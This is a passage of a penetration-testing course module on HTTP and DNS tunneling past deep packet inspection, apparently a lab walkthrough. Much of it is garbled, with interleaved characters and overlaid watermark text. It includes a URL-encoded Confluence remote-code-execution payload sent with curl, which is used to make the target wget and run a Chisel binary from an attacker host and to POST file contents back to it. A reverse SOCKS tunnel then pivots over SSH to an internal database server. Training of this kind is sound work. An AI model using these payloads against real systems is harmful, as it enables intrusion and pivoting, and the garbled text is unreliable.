@@ -1,0 +1,1204 @@
+                                                                          Penetration Testing with Kali Linux
+
+20 Tunneling Through Deep Packet Inspection
+
+In this Learning Module, we will cover the following Learning Units:
+· HTTP Tunneling Theory and Practice
+· DNS Tunneling Theory and Practice
+
+Deep packet inspection is a technology that's implemented to monitor traffic based on a set of
+rules. It's most often used on a network perimeter, where it can highlight patterns that are
+indicative of compromise.
+
+Deep packet inspection devices may be configured to only allow specific transport protocols into,
+out of, or across the network. For example, a network administrator could create a rule that
+terminates any outbound SSH traffic. If they implemented that rule, all connections that use SSH
+for transport would fail, including any SSH port redirection and tunneling strategies we had
+implemented.
+
+Given the variety of restrictions that may be implemented on a network, we need to learn and
+leverage several different tunneling tools and strategies to successfully bypass technologies like
+deep packet inspection.
+
+In this Module, we'll continue from the previous Port Redirection and SSH Tunneling Module,
+
+leveraging many concepts we introduced there. Most students should complete that Module
+
+before beginning this one.
+
+20.1 HTTP tunneling theory and praWchittilcoew
+
+This  Learning Unit covers the following  LearJneifnfgrOeybjectives:
+·     Learn about HTTP tunneling
+
+Iw·nitthhiaPsetLorefooalrrcmnainlHlgeTdUTcnPhititsuwenle.newliinllgexwOpiStlo-h5rCe77ht5his2ee19lc0oncept of HTTP tunneling, as well as how to perform it
+
+20.1.1 HTTP tunneling fundamentals
+
+Let's begin our exploration of HTTP tunneling by introducing a simple scenario. In this case, we
+have compromised CONFLUENCE01 and can execute commands via HTTP requests. However,
+once we try to pivot, we are blocked by a considerably restrictive network configuration.
+
+Specifically, a Deep Packet Inspection (DPI) solution is now terminating all outbound traffic except
+HTTP. In addition, all inbound ports on CONFLUENCE01 are blocked except TCP/8090. We can't
+rely on a normal reverse shell as it would not conform to the HTTP format and would be
+terminated at the network perimeter by the DPI solution. We also can't create an SSH remote port
+forward for the same reason. The only traffic that will reach our Kali machine is HTTP, so we
+could, for example, make requests with Wget and cURL.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  659
+                                                                                                                              Penetration Testing with Kali Linux
+
+     This is a hypothetical scenario: we haven't implemented any deep packet inspection in
+     the exercise lab! But imagining these restrictions can help us develop robust tunneling
+     strategies.
+
+The network configuration for this scenario is shown in the following diagram:
+
+Figure 277: The network setup with a firewall/deep packet inspector monitoring the data stream to CONFLUENCE01 on the
+                                                                     WAN interface
+
+In this case, the FIREWALL/INSPECTOR device    ihnaWtehsriftraelcopewla. ced  the  previous                                                           simple                        firewall.  In
+addition, MULTISERVER03 is blocked on the WAN
+
+atWhneeorehuattghvoeroincugrgehHdeTCnTOtPiNacFlsoLnUfonEreNcthCtieEon0P1fG.roDWmAeTCnAOeBeNAdFSLaEU0JteuE1fnNfsnCreeeErlyv0ien1rt.obutht enienetderntoalfingeutrweoorku,t bhuotwit  to SSH directly
+                                                                                                                                                                                    must resemble
+
+20.1.2         aHHTpTTePrTf.ePIct tatulsscnoenunesaerlOiisoSn-tgfh5o7erw7S5Ci2Sth1Hh9is0peClr,ohationsceHollTwTiPthtinunthneeltinugnnteoloslothoautr  encapsulates our data
+                                                                                                                                                      data will be encrypted.
+The above is
+stream within
+
+Chisel uses a client/server model. A Chisel server must be set up, which can accept a connection
+from the Chisel client. Various port forwarding options are available depending on the server and
+client configurations. One option that is particularly useful for us is reverse port forwarding, which
+is like SSH remote port forwarding.
+
+Chisel can run on macOS, Linux, and Windows, and on various architectures on each.
+Older tools like HTTPTunnel offer similar tunneling functionality but lack the flexibility
+and cross-platform capabilities of Chisel.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                       660
+                                                                                                                              Penetration Testing with Kali Linux
+
+Now that we know what Chisel is capable of, we can plan. We will run a Chisel server on our Kali
+machine, which will accept a connection from a Chisel client running on CONFLUENCE01. Chisel
+will bind a SOCKS proxy port on the Kali machine. The Chisel server will encapsulate whatever we
+send through the SOCKS port and push it through the HTTP tunnel, SSH-encrypted. The Chisel
+client will then decapsulate it and push it wherever it is addressed. When running, it should look
+somewhat like the following diagram:
+
+               Figure 278: How we intend out network setup to look once we have Chisel set up
+
+The traffic between the Chisel client and server is all HTTP-formatted. This means we can
+
+tCtorhativsheearlstsepeotrhrvteewrdoiellnebpoeuppraacKskaseleitdminbasacpchekicntueiopwntihslleolilsHuttTeioTnnPornteugTnaCnrePdllepWtoshoisrtthol1efo0wtC8hh0ei,scaeolSncOtleiCennKtstS, owpfhreoeaxrceyhpitHowrTti.lTlAPblelptafroacrfkwfeicat.rsTdeehndet
+
+wherever it's  addressed.     up  and  running  oJnefofurer yKali         machine.  In  the                                                                                                                                         usage  guide,  we  find  the  --
+Let's get the  Chisel server
+
+SrBseeOevrfCevoerKrsreSeawpnfelrdaosgxct.ylaiSerpnttoattrhratteirwnesgilerlutrbhvneeefrbr,CoowhmueinstsedOhhlSoeo-sn5sue7arltd7vhm5eec2reos1wp9eb0ryiintvhteahrrte.yh,Citshhfeislyae'grlecwjluiielslntmtinbeiitanianalrityzhetaodt  when the client connects, a
+
+                                                                                                                                                                                                                                    CONFLUENCE01. The Chisel
+                                                                                                                                                                                                                                    with either server or client as
+
+the first argument.
+
+If our target host is running a different operating system or architecture, we have to
+download and use the compiled binary for that specific operating system and
+architecture from the Chisel Github releases page.
+
+In this case, both CONFLUENCE01 and our Kali machine are amd64 Linux machines. That means
+we can try to run the same chisel binary we have on our Kali machine on CONFLUENCE01.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                     661
+                                                                          Penetration Testing with Kali Linux
+
+To get the Chisel binary onto CONFLUENCE01, we can leverage the injection to download it from
+our Kali machine over HTTP. We can serve the chisel binary using Apache. In order to do this, we
+must first copy the Chisel binary to our Apache2 server's webroot directory.
+
+kali@kali:~$ <cu>sudo cp $(which chisel) /var/www/html/</cu>
+kali@kali:~$
+
+                                   Listing 631 - Copying the Chisel binary to the Apache2 server folder.
+
+We can then make sure that Apache2 is started on our Kali machine using systemctl.
+
+kali@kali:~$ <cu>sudo systemctl start apache2</cu>
+[sudo] password for kali:
+
+kali@kali:~$
+
+                       Listing 632 - Starting Apache2.
+
+Next, we will build the wget command we want to run through the injection on CONFLUENCE01.
+This command will download the chisel binary to /tmp/chisel and make it executable:
+
+wget 192.168.118.4/chisel -O /tmp/chisel && chmod +x /tmp/chisel
+    Listing 633 - The Wget payload we use to download the Chisel binary to /tmp/chisel on CONFLUENCE01 and make it
+                                                                       executable.
+
+Next, we'll format this command to work with our curl Confluence injection payload.
+
+As before, you can modify the specific parts of the URL-encoded RCE payload that you
+
+need to, rather than trying to build a new payload from scratch, to avoid formatting
+
+     difficulties.     Whitlow
+
+kali@kali:~$ <cu>curl
+
+hBOb%ytaN2st0hapm/%:2/et/%m72%1p2/89%2Cc2.%h1i226ns7-a8ec.sl%5h%2o027r.0%%6n22%3C2:6%%822%207269w9%0g2./e%0etv2c%h4a2%lm0o%712dB98n%2e%2.w0212%%62n28e0B.jxwJ1%%ae12v2f8a00f.xj/r4.tae/svmycpcah/.rilcishpaetnilg.s%eS.2clP0rr%i2o-7cpet%2sE9snB.gisuitnleardMatenr%a2%2g8%e8%2r%299%2.28c2%%2o9m2.m9%gae7nDtd/%E2<n/8gic%u2n>e7
+Tkahlei@Akpaalcih:e~2$Lilsotgingfi6le34(-/Tvhaer/Wlogget/OapSap-y5alo7ca7hd5e2e21xe/9ac0uctcedeswsit.hloingo)urecvUeRnLtuCaonllfylusenhcoewinsjectthioen
+                                                                                                                                                          command.     the  Chisel
+
+                                                                                                                                                          request for
+
+binary coming in:
+
+kali@kali:~$ <cu>tail -f /var/log/apache2/access.log</cu>
+...
+<cr>192.168.50.63 - - [03/Oct/2023:15:53:16 -0400] "GET /chisel HTTP/1.1" 200 8593795
+"-" "Wget/1.20.3 (linux-gnu)"</cr>
+
+                                Listing 635 - The request for the Chisel binary hitting our Apache2 server.
+
+Now that we have the Chisel binary on both our Kali machine and the target, we can run them. On
+the Kali machine, we'll start the binary as a server with the server subcommand, along with the
+bind port (--port) and the --reverse flag to allow the reverse port forward.
+
+kali@kali:~$ <cu>chisel server --port 8080 --reverse</cu>
+<cr>2023/10/03 15:57:53 server: Reverse tunnelling enabled</cr>
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                    662
+                                                                                                                                 Penetration Testing with Kali Linux
+
+2023/10/03 15:57:53 server: Fingerprint Pru+AFGOUxnEXyK1Z14RMqeiTaCdmX6j4zsa9S2Lx7c=
+<cr>2023/10/03 15:57:53 server: Listening on http://0.0.0.0:8080</cr>
+
+                                             Listing 636 - Starting the Chisel server on port 8080.
+
+The Chisel server starts up and confirms that it is listening on port 8080 and has reverse
+tunneling enabled.
+
+Before we try to run the Chisel client, we'll run tcpdump on our Kali machine to log incoming
+traffic. We'll start the capture filtering to tcp port 8080 to only capture traffic on TCP port 8080.
+
+kali@kali:~$ <cu>sudo tcpdump -nvvvXi tun0 tcp port 8080</cu>
+tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+
+                           Listing 637 - Starting tcpdump to listen on TCP/8080 through the tun0 interface.
+
+Next, we'll try to start the Chisel client using the injection, applying the server address and the port
+forwarding configuration options on the command line.
+
+We want to connect to the server running on our Kali machine (192.168.118.4:8080), creating a
+reverse SOCKS tunnel (R:socks). The R prefix specifies a reverse tunnel using a socks proxy
+(which is bound to port 1080 by default). The remaining shell redirections (> /dev/null 2>&1 &)
+force the process to run in the background, so our injection does not hang waiting for the process
+to finish.
+
+/tmp/chisel client 192.168.118.4:8080 R:socks > /dev/null 2>&1 &
+                                   Listing 638 - The Chisel client command we run from the web shell.
+
+We'll convert this into a Confluence injection payload and send it to CONFLUENCE01.
+
+Bc7bkhaDtay%sN2/ltah7p<i:m/%@%ec/2k2%7au/C%%>2l19282iC2%:7/.2~%$2t12n67m-a<8p/c.suhc5>ho0.ircuns6%r3el2l:%82%200920c9l./i%ee2v4an%lt%%7B220n81%e9w222%.n2e10w6jJ8%ae.2vf01af1jxra.8evs.y4acr:.Wil8hipa0t8nl.g0o%S.wcP20rrioRp:csteoEssncBgkusi%ni2eld7Mea%n2r9a%g2.8es%tr%a29r2t.8%%c2o298mm.%ag2en9%dt2%En22g8%2i%n92%7e
+
+sHkaeolrwvie@erkvoaelur,itp:n~uo$tthdionegsLnhis'attipnsgphe6o3nw9s-.aSnWtayOertSain-cdg5to7itvhn7ie'5tty2C.s1h9eis0eel  client  using the Confluence injection payload.  and  the  Chisel
+
+                                                                                                                         any     traffic hit our Tcpdump session,
+
+This indicates there may be something wrong with the way we're running the Chisel client
+process on CONFLUENCE01. However, we don't have direct access to the error output when
+running the binary. We need to figure out a way to read the command output, which may be able
+to point us towards the problem. We should then be able to solve it.
+
+To read the command output, we can construct a command which redirects stdout and stderr
+output to a file, and then send the contents of that file over HTTP back to our Kali machine. We
+use the &> operator, which directs all streams to stdout, and write it to /tmp/output. We then run
+curl with the ­data flag, telling it to read the file at /tmp/output, and POST it back to our Kali
+machine on port 8080.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                            663
+                                                                          Penetration Testing with Kali Linux
+
+/tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output
+http://192.168.118.4:8080/
+
+                                      Listing 640 - The error-collecting-and-sending command string.
+
+We can then create an injection payload using this command string, and send it to the vulnerable
+Confluence instance.
+
+kali@kali:~$ <cu>curl
+http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngine
+ByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27
+bash%27%2C%27-
+c%27%2C%27/tmp/chisel%20client%20192.168.118.4:8080%20R:socks%20%26%3E%20/tmp/output%2
+0%3B%20curl%20--
+data%20@/tmp/output%20http://192.168.118.4:8080/%27%29.start%28%29%22%29%7D/</cu>
+kali@kali:~$
+
+                                      Listing 641 - The error-collecting-and-sending injection payload.
+
+On sending this new injection, we check Tcpdump output for attempted connections.
+
+...
+
+16:30:50.915895 IP (tos 0x0, ttl 61, id 47823, offset 0, flags [DF], proto TCP (6),
+
+length 410)
+
+     192.168.50.63.50192 > 192.168.118.4.8080: Flags [P.], cksum 0x1535 (correct), seq
+
+1:359, ack 1, win 502, options [nop,nop,TS val 391724691 ecr 3105669986], length 358:
+
+HTTP, length: 358
+
+         POST / HTTP/1.1
+
+         Host: 192.168.118.4:8080
+
+         User-Agent: curl/7.68.0
+
+         Accept: */*
+
+         <CCoocrnn>tte/enntmtt--pLT/eycnphegit:she:alp:p20l/i4lciabt/ixo8n6/_x64-w-wlwin-ufxor-mgn-uu/rWllhiietbnlcco.owsdoe.d6: version `GLIBC_2.32' not
+`foGLunIBdC_(r20e.x3q04u0i'0r0ne:dotb4fy5o0/u0ntmd0p1/(9rcaheiqbusaiecrlf)ed/4t0mb0py0/c/3thdimJ0pse6/efclff:hr7ie2s/y9leilcb)0/a[x88|6hd_tb6t34pf]-<l/iEcn.ru.>x.-.g.n@u./=l.i.b)c...s.o?.6: version
+         gtlh0ibexc0o,0wu10thp:iucht ctth0haae8tCr2OuLdnNidsnF4tiinnLgcUgO46SE41/-N2t05m7C- 71TpE5hf/02e9c110oh9usi0tsdepe1ur5lvt eefprror1omdbdot1uhebecsef2ansbiol.i8ntCg8hhCa0ihsv0isee2el.dl cisom.tr.my-ian.n.gd.. t.o..u^s.e.+v.e.r-sions
+...                                                                                                                                                                                                                                              2.32  and
+
+We get
+2.34 of
+
+     This module was written in 2023, using Chisel version 1.8.1-0kali2 (go1.20.7). The Kali
+     repos will likely contain later versions of Chisel in the future, and the exact error
+     message that comes back from these later versions of Chisel may be different.
+     However, the same principle applies. We have encountered an error trying to run a
+     payload on a target system. As such, we must find an alternative payload which will run.
+     Finding a way around these kinds of setbacks is an important skill which can be applied
+     to many other situations where tool incompatibilities arise.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                               664
+                                                                                Penetration Testing with Kali Linux
+
+This points towards a version incompatibility. When a version of a tool or component is more
+recent than the operating system it's trying to run on, there's a risk that the operating system will
+not contain the required technologies that the newer tool is expecting to be able to use. In this
+case, Chisel is expecting to use glibc version 2.32 or 2.34, neither of which can be found on
+CONFLUENCE01.
+
+To try to find a solution, let's first check the version information for the Chisel binary we have on
+Kali, which we are also trying to run on CONFLUENCE01.
+
+kali@kali:~$ <cu>chisel -h</cu>
+
+Usage: chisel [command] [--help]
+
+Version: <cr>1.8.1-0kali2 (go1.20.7)</cr>
+
+Commands:
+   server - runs chisel in server mode
+   client - runs chisel in client mode
+
+Read more:
+   https://github.com/jpillora/chisel
+
+kali@kali:~$
+     Listing 643 - The version of Chisel reported as part of the -h output, along with the version of Go used to compile it.
+
+The version of Chisel that ships with this version of Kali is 1.8.1. However, there is another detail
+that's important here. It has been compiled with Go version 1.20.7.
+
+Some light web surfing reveals: -  similar - messages  Wvheirtslioonws    1.20  and  later  are  run  on  operating
+Where it appears when binaries     compiled with Go
+
+sOynsttehme sCthhisaetldGonith'tuhbavpeaagec,owmepfaitnibdleanve"rosfifoJicneifaoflf"rgeclyoibmc.piled binary, also version 1.8.1, is compiled
+iwWCnhitetrihsocedGaluon1c.ve8feid.r1rssttbihoidinnsoa1wgr.yl1nibf9looc.arVidLneicnrtsohuimeoxnpogan1ztOi.api1Sbmp9-ile5idit7dsy67.o54bW2nipn1eir9atohv0rcyeterhfssraisootomnirnsoG.fmTiGthhioniusdlbo,iswwuaseevirnactgihalaanwbnltgerteyhote.nuvWsteihneregsicmotahnaneitnhuGCanotphsai1sec.e1eklm9Gt-hsictaohttomuubhps.aiilnevegd
+
+gunzip, then copy it over to the /var/www/html/ folder so we can serve it using Apache.
+
+kali@kali:~$ <cu>wget
+https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.g
+z</cu>
+
+--2023-10-03 16:33:35--
+https://github.com/jpillora/chisel/releases/download/v1.8.1/chisel_1.8.1_linux_amd64.g
+z
+Resolving github.com (github.com)... 140.82.121.4
+Connecting to github.com (github.com)|140.82.121.4|:443... connected.
+...
+Length: 3494246 (3.3M) [application/octet-stream]
+Saving to: 'chisel_1.8.1_linux_amd64.gz'
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                      665
+                                                                          Penetration Testing with Kali Linux
+
+chisel_1.8.1_linux_am 100%[========================>] 3.33M 9.38MB/s in 0.4s
+
+2023-10-03 16:33:37 (9.38 MB/s) - 'chisel_1.8.1_linux_amd64.gz' saved
+[3494246/3494246]
+
+kali@kali:~$ <cu>gunzip chisel_1.8.1_linux_amd64.gz</cu>
+
+kali@kali:~$ <cu>sudo cp ./chisel /var/www/html</cu>
+[sudo] password for kali:
+
+kali@kali:~$
+
+     Listing 644 - Downloading Chisel 1.8.1 from the main Chisel repo, and copying it to the Apache web root directory.
+
+This will overwrite the copy of Chisel we had already copied into the Apache web root directory.
+We can then just run the same Wget injection as we did before, to force the CONFLUENCE01
+server to download the Chisel binary and write it to /tmp/chisel.
+
+kali@kali:~$ <cu>curl
+http://192.168.50.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngine
+ByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27
+bash%27%2C%27-c%27%2C%27wget%20192.168.118.4/chisel%20-
+O%20/tmp/chisel%20%26%26%20chmod%20%2Bx%20/tmp/chisel%27%29.start%28%29%22%29%7D/</cu>
+
+kali@kali:~$
+                 Listing 645 - The Wget payload executed within our cURL Confluence injection command, again.
+
+We can then try to run the Chisel client again on CONFLUENCE01 using the injection.
+
+BbhkyatatlsNphia%:@m/ek2%/7a1l%28i922%:C~.2%$1227n6-<8a.csuh50>orc.un6%3r:l2280%2909/.%e2va4%l%72Bn8e%w2%22n0ejw%av20ajx.avsac.rWilhipatntlg.o.SwcPrroicpetsEnsgBiunielMdeanr%a2ge8%r%292.8%co29m.magendtE%2ng8i%n27e
+7c%D/2<7%/2cCu%>27/tmp/chisel%20client%20192.16J8e.f1f1r8e.y4:8080%20R:socks%27%29.start%28%29%22%29%
+Tkkaahllisii@@tikkmaalleii, ::d~~if$$fLeissrteuinndgot6k4ti6ncd-pTdoruyfmintpgrat-offnOsicvStav-irsv5t X7tlho7ie5gC2tg1huei9nsd0e0linctliceonputrupTsoicnrgptdth8ue0mC8op0nfslueesnscieoinnj.ection payload, again.
+
+tcpdump: listening on tun0, link-type EN10MB (Ethernet), snapshot length 262144 bytes
+...
+18:13:53.687533 IP (tos 0x0, ttl 63, id 53760, offset 0, flags [DF], proto TCP (6),
+length 276)
+
+       192.168.50.63.41424 > 192.168.118.4.8080: Flags [P.], cksum 0xce2b (correct), seq
+1:225, ack 1, win 502, options [nop,nop,TS val 1290578437 ecr 143035602], length 224:
+HTTP, length: 224
+
+              <cr>GET / HTTP/1.1
+              Host: 192.168.118.4:8080
+              User-Agent: Go-http-client/1.1
+              Connection: Upgrade
+              Sec-WebSocket-Key: L8FCtL3MW18gHd/ccRWOPQ==
+              Sec-WebSocket-Protocol: chisel-v3
+              Sec-WebSocket-Version: 13
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  666
+                                                                                Penetration Testing with Kali Linux
+
+         Upgrade: websocket</cr>
+
+         0x0000: 4500 0114 d200 4000 3f06 3f4f c0a8 323f E.....@.?.?O..2?
+
+         0x0010: c0a8 7604 a1d0 1f90 61a9 fe5d 2446 312e ..v.....a..]$F1.
+
+         0x0020: 8018 01f6 ce2b 0000 0101 080a 4cec aa05 .....+......L...
+
+         0x0030: 0886 8cd2 4745 5420 2f20 4854 5450 2f31 ....GET./.HTTP/1
+
+         0x0040: 2e31 0d0a 486f 7374 3a20 3139 322e 3136 .1..Host:.192.16
+
+         0x0050: 382e 3131 382e 343a 3830 3830 0d0a 5573 8.118.4:8080..Us
+
+         0x0060: 6572 2d41 6765 6e74 3a20 476f 2d68 7474 er-Agent:.Go-htt
+
+         0x0070: 702d 636c 6965 6e74 2f31 2e31 0d0a 436f p-client/1.1..Co
+
+         0x0080: 6e6e 6563 7469 6f6e 3a20 5570 6772 6164 nnection:.Upgrad
+
+         0x0090: 650d 0a53 6563 2d57 6562 536f 636b 6574 e..Sec-WebSocket
+
+         0x00a0: 2d4b 6579 3a20 4c38 4643 744c 334d 5731 -Key:.L8FCtL3MW1
+
+         0x00b0: 3867 4864 2f63 6352 574f 5051 3d3d 0d0a 8gHd/ccRWOPQ==..
+
+         0x00c0: 5365 632d 5765 6253 6f63 6b65 742d 5072 Sec-WebSocket-Pr
+
+         0x00d0: 6f74 6f63 6f6c 3a20 6368 6973 656c 2d76 otocol:.chisel-v
+
+         0x00e0: 330d 0a53 6563 2d57 6562 536f 636b 6574 3..Sec-WebSocket
+
+         0x00f0: 2d56 6572 7369 6f6e 3a20 3133 0d0a 5570 -Version:.13..Up
+
+         0x0100: 6772 6164 653a 2077 6562 736f 636b 6574 grade:.websocket
+
+         0x0110: 0d0a 0d0a                                                ....
+
+18:13:53.687745 IP (tos 0x0, ttl 64, id 60604, offset 0, flags [DF], proto TCP (6),
+
+length 52)
+
+     192.168.118.4.8080 > 192.168.50.63.41424: Flags [.], cksum 0x46ca (correct), seq
+
+1, ack 225, win 508, options [nop,nop,TS ...
+
+...
+
+                   Listing 647 - Inbound Chisel traffic logged by our tcpdump session.
+
+The traffic that Tcpdump has logged indicates that the Chisel client has created an HTTP
+
+WebSocket connection with the server running on out Kali machine.
+
+2O2k20a00n222lt3i33o@///p1k110a00ol///f000it3:33h~is111$555, o<:::5c55u777ur :>::C55c5hh333iissssseeeeel rrlrsvvveeeesrrrreve::r:vr FeRLhireiasnvsetg-lree-ornspgepiogrnretgitdnunot8aJnn0enPe8flhr0ifnultrb+ti-eonpA-yg:Fru/GeWneO/vhdi0nUectxa.rlo0nbso.lEenweX0<ndy./e0Kcc:1ut8Z>io10n48.0RMqeiTaCdmX6j4zsa9S2Lx7c=
+22Nv00eor22w33s/i/, 1o1w00ne//(00c331a.n118c88.h1::-11e033ck::ka55tl44hie2sss)eeLtrriasvvttieenurrgs::6oO4ssfS8ee-o-ss5uInss7rc7iioS5oom2Onn1##inC922g0K::cSoCtnplunrineoce:xtnioytpnrwlvooiextghgyre#ssdiRsb:o.yn12th7(e.1C0.h8.i.0se1.l1)s:ed1rvi0ef8r.f0e=r>ssofcrkosm:  server
+                                                                                                                                                                                                                                                                            Listening
+
+kali@kali:~$ <cu>ss -ntplu</cu>
+
+Netid      State      Recv-Q      Send-Q                                  Local Address:Port                                                                                                                                                                                Peer
+
+Address:Port       Process
+
+udp        UNCONN     0           0                                       0.0.0.0:34877
+
+0.0.0.0:*
+
+<cr>tcp       LISTEN        0          4096                               127.0.0.1:1080
+
+0.0.0.0:*          users:(("chisel",pid=501221,fd=8))</cr>
+
+tcp        LISTEN     0           4096                                    *:8080
+
+*:*         users:(("chisel",pid=501221,fd=6))
+
+tcp        LISTEN     0           511                                     *:80
+
+*:*
+
+            Listing 649 - Using ss to check if our SOCKS port has been opened by the Kali Chisel server.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                                                                                                                                                                                                                                667
+                                                                          Penetration Testing with Kali Linux
+
+Our SOCKS proxy port 1080 is listening on the loopback interface of our Kali machine.
+
+Let's use this to connect to the SSH server on PGDATABASE01. In Port Redirection and SSH
+Tunneling, we created SOCKS proxy ports with both SSH remote and classic dynamic port
+forwarding and used Proxychains to push non-SOCKS-native tools through the tunnel. But we've
+not yet actually run SSH itself through a SOCKS proxy.
+
+SSH doesn't offer a generic SOCKS proxy command-line option. Instead, it offers the
+ProxyCommand configuration option. We can either write this into a configuration file, or pass it
+as part of the command line with -o.
+
+ProxyCommand accepts a shell command that is used to open a proxy-enabled channel. The
+documentation suggests using the OpenBSD version of Netcat, which exposes the -X flag and can
+connect to a SOCKS or HTTP proxy. However, the version of Netcat that ships with Kali doesn't
+support proxying.
+
+Instead, we'll use Ncat, the Netcat alternative written by the maintainers of Nmap. We can install
+this on Kali with sudo apt install ncat.
+
+kali@kali:~$ <cu>sudo apt install ncat</cu>
+Reading package lists... Done
+Building dependency tree... Done
+Reading state information... Done
+The following NEW packages will be installed:
+
+   ncat
+0 upgraded, 1 newly installed, 0 to remove and 857 not upgraded.
+Need to get 487 kB of archives.
+
+AF[Geef39ttt3c:e1rhekhBtd]thit48ps:7/op/kBhetraittnp.ik5osanl,(i89.7o1.9r3gk/kBkaBo/lsfi)kaaddliit-iroonlallindgi/smkaWihisntplaaocmwed6w4ilnlcabteaumsde6d4.7.94+dfsg1-1kali2
+SP(Rreleeaepcaditrniignnggdtapotraeuvbinaopsueasclk..y..u.2.n/9sen86lcea7c9tt_f7ei.d9l4peas+dckafnasdgg1eJd-eni1frckfaearctlet.iyo2r_iaemsd6c4u.rdreebnt.l.y. installed.)
+PSUPkenarrolptoitcac@eiecnksksaigssliininunggg:p~nt$ntcarcriatiggtg(g(7eerr7.9.ss94+f4fodo+rfrdfskmsg1gaaln1-i1--O1-dkSbkma-eal5Lln(i7is72iu2t5.i2)n21)(g121.69.0..502.2.03.--.3In4)s.t5.a).lli.n.g.N.cat with apt.
+
+Now we'll pass an Ncat command to ProxyCommand. The command we construct tells Ncat to
+use the socks5 protocol and the proxy socket at 127.0.0.1:1080. The %h and %p tokens represent
+the SSH command host and port values, which SSH will fill in before running the command.
+
+kali@kali:~$ <cu>ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080
+%h %p' database_admin@10.4.50.215</cu>
+The authenticity of host '10.4.50.215 (<no hostip for proxy command>)' can't be
+established.
+ED25519 key fingerprint is SHA256:IGz427yqW3ALf9CKYWNmVctA/Z/emwMWWRG5qQP8JvQ.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? <cu>yes</cu>
+Warning: Permanently added '10.4.50.215' (ED25519) to the list of known hosts.
+database_admin@10.4.50.215's password:
+Welcome to Ubuntu 22.04 LTS (GNU/Linux 5.15.0-41-generic x86_64)
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.  668
+                                                                          Penetration Testing with Kali Linux
+
+* Documentation: https://help.ubuntu.com
+
+* Management:  https://landscape.canonical.com
+
+* Support:     https://ubuntu.com/advantage
+
+0 updates can be applied immediately.
+
+Last login: Thu Jul 21 14:04:11 2022 from 192.168.97.19
+database_admin@pgbackup1:~$
+
+                              Listing 651 - A successful SSH connection through our Chisel HTTP tunnel.
+
+Very nice! We gained access to the SSH server, through our Chisel reverse SOCKS proxy,
+tunneling traffic through a reverse HTTP tunnel.
+
+In this Learning Unit, we created a reverse tunnel using Chisel, and then used this tunnel to log in
+to an SSH server on PGDATABASE01 within the internal network. We did this with only HTTP-
+formatted traffic to and from the compromised CONFLUENCE01 pivot server.
+
+20.2 DNS tunneling theory and practice
+
+This Learning Unit covers the following Learning Objectives:
+· Learn about DNS tunneling
+· Perform DNS tunneling with dnscat2
+
+DNS is one of the foundational Internet protocols and has been abused by attackers for various
+
+nosciaefmlflareperdlisioftdiureniscdstpci"vacuetrr2ap.nsoehstewcsoo. uFrkrosreee"nxivnairmoDnpNmleS,e. intWtcsea. nwTsiolel rtuvhneednaesrlesaatamrWnnhedihctohelwaxonawticsotmlypethorfootwurmnntheDilsNdSawtoaturiknnsnd,eirlleienctg'tslywpinitrheasnaednttoouoatl
+            DNS tunneling fundamJeefnftraeyls
+20.2.1
+
+IttaPhhcercaoeduIPsdgsrhaeadtshdsdeeroespms,rsonacionoetfsbhasyuomihtfsuarmndeso-aromenla-vardieinnaOagbSdn-ltaeah5bm7enl7eaIe5Pm,2avw1d4e9eds0a,rndeaedsreesred, uswfssireeosdtfnto"eowebwdtraowituno.teeitaxsIasnmkItPepvraanledre.idctoroudemsasts"aD...NTWoShrseeentrreiveveveresr .w(oLeretwr'esasnowtlvatelok)
+
+In most cases, we'll ask a DNS recursive resolver server for the DNS address record (A record) of
+the domain. An A record is a DNS data type that contains an IPv4 address. The recursive resolver
+does most of the work: it will make all the following DNS queries until it satisfies the DNS request,
+then returns the response to us.
+
+Once it retrieves the request from us, the recursive resolver starts making queries. It holds a list of
+root name servers (as of 2022, there are 13 of them scattered around the world). Its first task is to
+send a DNS query to one of these root name servers. Because example.com has the ".com"
+suffix, the root name server will respond with the address of a DNS name server that's
+responsible for the .com top-level domain (TLD). This is known as the TLD name server.
+
+PEN-200 - Copyright © 2026 OffSec Services Limited. All rights reserved.                                 669
+                                                                                                                              Penetration Testing with Kali Linux
+
+The recursive resolver then queries the .com TLD name server, asking which DNS server is
+responsible for example.com. The TLD name server will respond with the authoritative name
+server for the example.com domain.
+
+The recursive resolver then asks the example.com authoritative name server for the IPv4 address
+of www.example.com. The example.com authoritative name server replies with the A record for
+that.
+
+The recursive resolver then returns that to us. All these requests and responses are transported
+over UDP, with UDP/53 being the standard DNS port.
+
+In our lab network, with MULTISERVER03 as the DNS server, a request from PGDATABASE01 for
+the IP address of www.example.com would follow the flow shown below. The firewalls have been
+removed from this diagram for simplicity.
+
+                                                              Whitlow
+                                                    Jeffrey
+     pItr'sogcroFamigmumrmeo2en7d9t:ionTthuoeshtehigtehh-seletvroeeclcDkOuNSIr-SSs5Pri7veq7eruo5re2ues1tst9efo0lrol)vw, eb, rwupitthrooMtvhUiedLreTwIdSEebRlylV-kaEnRno0I3wScPnon(pwfuighbuilricecdhraeissctuuhesrsuDivaNelSlynrepasmroelve-er
+     servers can be used as well. For example, Google has a public DNS server at 8.8.8.8.
+
+Let's try this out in a new scenario in the lab, which is configured precisely for this purpose. In this
+scenario, we have a new server: FELINEAUTHORITY. This server is situated on the WAN
